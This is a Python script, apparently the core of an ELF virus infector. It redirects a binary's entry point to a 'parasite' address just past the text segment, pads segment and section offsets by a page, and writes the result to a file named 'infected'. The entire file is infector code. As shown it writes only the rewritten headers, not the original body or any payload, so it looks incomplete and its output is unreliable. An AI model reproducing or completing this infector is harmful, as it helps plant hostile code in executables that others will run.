import sys

from binary import Binary
from consts import *

def main():
    if len(sys.argv) != 2:
        print('Usage: main.py <binary>')
        return 1

    binary = sys.argv[1]
    binary_file = open(binary, 'rb')
    binary_obj = Binary(binary_file)

    binary_obj.ehdr.e_shoff += PAGE_SIZE

    for phdr in binary_obj.phdrs:
        if phdr.p_type == PT_LOAD and phdr.p_offset == 0:
            o_text_filesz = phdr.p_filesz
            end_of_text = phdr.p_offset + phdr.p_filesz
            parasite_vaddr = phdr.p_vaddr + o_text_filesz

            binary_obj.ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz
            phdr.p_filesz += 1
            phdr.p_memsz += 1
            text_phdr_off = phdr.p_offset

    for phdr in binary_obj.phdrs:
        if phdr.p_offset > text_phdr_off + o_text_filesz:
            phdr.p_offset += PAGE_SIZE

    for shdr in binary_obj.shdrs:
        if shdr.sh_addr + shdr.sh_size == parasite_vaddr:
            shdr.sh_size += 1
        if shdr.sh_offset > text_phdr_off + o_text_filesz + 1:
            shdr.sh_offset += PAGE_SIZE

    new_file = open('infected', 'wb')
    new_file.write(binary_obj.ehdr.get_packed())
    for phdr in binary_obj.phdrs:
        new_file.write(phdr.get_packed())
    new_file.seek(binary_obj.ehdr.e_shoff)
    for shdr in binary_obj.shdrs:
        new_file.write(shdr.get_packed())

    new_file.close()




    binary_file.close()

if __name__ == '__main__':
    main()
